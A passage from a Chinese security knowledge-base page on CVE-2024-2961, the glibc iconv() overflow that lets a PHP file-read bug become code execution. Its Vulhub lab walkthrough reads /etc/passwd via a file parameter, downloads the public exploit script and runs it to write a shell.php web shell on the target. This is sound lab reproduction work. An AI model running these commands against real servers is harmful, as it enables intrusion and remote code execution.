<p>在第 2 部分中，我们将更深入地研究 PHP 引擎，以定位在非常流行的 PHP 网络邮件中发现的 <code>iconv()</code> 调用。我将描述这种直接调用对 PHP 生态系统的影响，并向您展示一些意想不到的接收器。最后，在第 3 部分中，我们将介绍盲文件读取漏洞利用。</p>
<p>敬请关注！</p>
<h1>VULHUB复现</h1>
<p>GNU C 是一个标准的ISO C依赖库。在GNU C中，<code>iconv()</code>函数2.39及以前存在一处缓冲区溢出漏洞，这可能会导致应用程序崩溃或覆盖相邻变量。</p>
<p>如果一个PHP应用中存在任意文件读取漏洞，攻击者可以利用<code>iconv()</code>的这个CVE-2024-2961漏洞，将其提升为代码执行漏洞。</p>
<p>参考链接：</p>
<ul>
<li><a href="https://www.ambionics.io/blog/iconv-cve-2024-2961-p1" target="_blank" rel="noopener noreferrer">https://www.ambionics.io/blog/iconv-cve-2024-2961-p1</a></li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="漏洞环境">漏洞环境<a href="#漏洞环境" class="hash-link" aria-label="Direct link to 漏洞环境" title="Direct link to 漏洞环境" translate="no">​</a></h2>
<p>执行如下命令启动一个PHP 8.3.4服务器，其使用iconv 2.36作为依赖：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">docker compose up -d</span><br></span></code></pre></div></div>
<p>服务启动后，你可以通过<code>http://your-ip:8080/index.php?file=/etc/passwd</code>这个链接读取<code>/etc/passwd</code>文件。</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="漏洞复现">漏洞复现<a href="#漏洞复现" class="hash-link" aria-label="Direct link to 漏洞复现" title="Direct link to 漏洞复现" translate="no">​</a></h2>
<p>在使用原作者给出的<a href="https://github.com/ambionics/cnext-exploits" target="_blank" rel="noopener noreferrer">exploit</a>前，你需要准备一个Linux环境和Python 3.10解释器。</p>
<p>安装依赖：</p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pip install pwntools</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">pip install https://github.com/cfreal/ten/archive/refs/heads/main.zip</span><br></span></code></pre></div></div>
<p>然后从<a href="https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py%E4%B8%8B%E8%BD%BDPOC%E5%B9%B6%E6%89%A7%E8%A1%8C%EF%BC%9A" target="_blank" rel="noopener noreferrer">https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py下载POC并执行：</a></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">wget https://raw.githubusercontent.com/ambionics/cnext-exploits/main/cnext-exploit.py</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">python cnext-exploit.py http://your-ip:8080/index.php &quot;echo &#x27;&lt;?=phpinfo();?&gt;&#x27; &gt; shell.php&quot;</span><br></span></code></pre></div></div>
<p><img decoding="async" loading="lazy" src="https://cdn.wjlin0.com/img/202501241112571.png-.png" alt="img" class="img_ev3q"></p>
<p>可见，我们已经成功写入<code>shell.php</code>：</p>
<p><img decoding="async" loading="lazy" src="https://cdn.wjlin0.com/img/202501241112572.png-.png" alt="img" class="img_ev3q"></p>
<h1>转载</h1>
<ul>
<li><a href="https://github.com/vulhub/vulhub/blob/master/php/CVE-2024-2961/README.zh-cn.md" target="_blank" rel="noopener noreferrer">https://github.com/vulhub/vulhub/blob/master/php/CVE-2024-2961/README.zh-cn.md</a></li>
<li><a href="https://www.ambionics.io/blog/iconv-cve-2024-2961-p1#cve-2024-2961-a-bug-in-the-glibc" target="_blank" rel="noopener noreferrer">https://www.ambionics.io/blog/iconv-cve-2024-2961-p1#cve-2024-2961-a-bug-in-the-glibc</a></li>
</ul></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="row margin-top--sm theme-doc-footer-edit-meta-row"><div class="col"><a href="https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/个人知识库/07.CTF/02.奇技淫巧/01.PHP利用GNU-C-Iconv将文件读取变成RCE（CVE-2024-2961）.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>Edit this page</a></div><div class="col lastUpdated_JAkA"></div></div></footer></article><nav class="docusaurus-mt-lg pagination-nav" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/en/docs/个人知识库/CTF/Knownsec/knownsec-ctf-09/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">KnownSec 2023年度第五次内部攻防演练</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/en/docs/个人知识库/CTF/奇技淫巧/利用shell脚本变量构造无字母数字命令"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">利用shell脚本变量构造无字母数字命令</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#介绍" class="table-of-contents__link toc-highlight">介绍</a></li><li><a href="#发现一个关于过滤器的故事" class="table-of-contents__link toc-highlight">发现：一个关于过滤器的故事</a><ul><li><a href="#php-中的文件读取原语" class="table-of-contents__link toc-highlight">PHP 中的文件读取原语</a></li><li><a href="#php过滤器简介" class="table-of-contents__link toc-highlight">PHP过滤器简介</a></li><li><a href="#php-过滤器前缀后缀和-crash" class="table-of-contents__link toc-highlight">PHP 过滤器：前缀、后缀和 crash</a></li></ul></li><li><a href="#glibc-中存在一个错误cve-2024-2961" class="table-of-contents__link toc-highlight">Glibc 中存在一个错误CVE-2024-2961</a><ul><li><a href="#the-iconv-api" class="table-of-contents__link toc-highlight">The <code>iconv()</code> API</a></li><li><a href="#转换为-iso-2022-cn-ext-时出界写入" class="table-of-contents__link toc-highlight">转换为 ISO-2022-CN-EXT 时出界写入</a></li><li><a href="#条件和原始" class="table-of-contents__link toc-highlight">条件和原始</a></li></ul></li><li><a href="#利用php过滤器" class="table-of-contents__link toc-highlight">利用PHP过滤器</a><ul><li><a href="#php堆的入门" class="table-of-contents__link toc-highlight">PHP堆的入门</a></li><li><a href="#php-过滤器内部" class="table-of-contents__link toc-highlight">PHP 过滤器内部</a></li><li><a href="#情况和目标" class="table-of-contents__link toc-highlight">情况和目标</a></li><li><a href="#开发" class="table-of-contents__link toc-highlight">开发</a></li></ul></li><li><a href="#冲击" class="table-of-contents__link toc-highlight">冲击</a><ul><li><a href="#标准水槽" class="table-of-contents__link toc-highlight">标准水槽</a></li><li><a href="#使用漏洞" class="table-of-contents__link toc-highlight">使用漏洞</a></li><li><a href="#作为-phar-的替代品" class="table-of-contents__link toc-highlight">作为 PHAR 的替代品</a></li><li><a href="#解析库" class="table-of-contents__link toc-highlight">解析库</a></li><li><a href="#类实例化" class="table-of-contents__link toc-highlight">类实例化</a></li><li><a href="#作为对小工具链的改进" class="table-of-contents__link toc-highlight">作为对小工具链的改进</a></li><li><a href="#其他人可能" class="table-of-contents__link toc-highlight">其他人，可能</a></li></ul></li><li><a href="#时间线" class="table-of-contents__link toc-highlight">时间线</a></li><li><a href="#结论" class="table-of-contents__link toc-highlight">结论</a></li><li><a href="#漏洞环境" class="table-of-contents__link toc-highlight">漏洞环境</a></li><li><a href="#漏洞复现" class="table-of-contents__link toc-highlight">漏洞复现</a></li></ul></div></div></div></div></main></div></div></div><footer class="theme-layout-footer footer footer--dark"><div class="container container-fluid"><div class="row footer__links"><div class="theme-layout-footer-column col footer__col"><div class="footer__title">内容导航</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="/docs/intro"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" aria-hidden="true" style="margin-right:6px;vertical-align:text-bottom"><rect x="3" y="4" width="14" height="16" rx="2" fill="currentColor"></rect><rect x="5" y="6" width="10" height="1.5" fill="white" opacity="0.9"></rect><rect x="5" y="9" width="10" height="1.5" fill="white" opacity="0.9"></rect></svg>个人知识库</a></li><li class="footer__item"><a class="footer__link-item" href="/docs/更新日志"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true" style="margin-right:6px;vertical-align:text-bottom"><circle cx="12" cy="12" r="8" stroke="currentColor" stroke-width="2"></circle><polyline points="12,7 12,12 16,14" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"></polyline></svg>日志更新</a></li><li class="footer__item"><a class="footer__link-item" href="https://www.wjlin0.com/links"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true" style="margin-right:6px;vertical-align:text-bottom"><polyline points="8,5 16,12 8,19" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"></polyline></svg>友链</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">实用工具</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="https://stackoverflow.com/questions/tagged/docusaurus" target="_blank" rel="noopener noreferrer"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true" style="margin-right:6px;vertical-align:text-bottom"><polyline points="8,5 16,12 8,19" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"></polyline></svg>微信公众号写文章助手</a></li><li class="footer__item"><a class="footer__link-item" href="https://gtfobins.github.io/" target="_blank" rel="noopener noreferrer"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true" style="margin-right:6px;vertical-align:text-bottom"><polyline points="8,5 16,12 8,19" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"></polyline></svg>GTFOBins</a></li><li class="footer__item"><a class="footer__link-item" href="https://revshells.com" target="_blank" rel="noopener noreferrer"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true" style="margin-right:6px;vertical-align:text-bottom"><polyline points="8,5 16,12 8,19" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"></polyline></svg>红队工具</a></li><li class="footer__item"><a class="footer__link-item" href="https://regex-vis.com/" target="_blank" rel="noopener noreferrer"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true" style="margin-right:6px;vertical-align:text-bottom"><polyline points="8,5 16,12 8,19" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"></polyline></svg>正则可视化</a></li></ul></div><div class="theme-layout-footer-column col footer__col"><div class="footer__title">关注我</div><ul class="footer__items clean-list"><li class="footer__item"><a class="footer__link-item" href="https://github.com/wjlin0" target="_blank" rel="noopener noreferrer"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true" style="margin-right:6px;vertical-align:text-bottom"><polyline points="7,8 4,12 7,16" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"></polyline><polyline points="17,8 20,12 17,16" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"></polyline><line x1="10" y1="18" x2="14" y2="6" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>GitHub</a></li><li class="footer__item"><a class="footer__link-item" href="mailto:admin@wjlin0.com" target="_blank" rel="noopener noreferrer"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true" style="margin-right:6px;vertical-align:text-bottom"><rect x="3" y="6" width="18" height="12" rx="2" ry="2" stroke="currentColor" stroke-width="2" fill="none"></rect><polyline points="4,7 12,13 20,7" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"></polyline></svg>联系我</a></li><li class="footer__item"><a class="footer__link-item" href="https://www.wjlin0.com/links#add"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" aria-hidden="true" style="margin-right:6px;vertical-align:text-bottom"><circle cx="12" cy="12" r="8" stroke="currentColor" stroke-width="2" fill="none"></circle><line x1="12" y1="8" x2="12" y2="16" stroke="currentColor" stroke-width="2" stroke-linecap="round"></line><line x1="8" y1="12" x2="16" y2="12" stroke="currentColor" stroke-width="2" stroke-linecap="round"></line></svg>添加友链</a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2025 wjlin0 知识库</div></div></div></footer></div>
</body>
</html>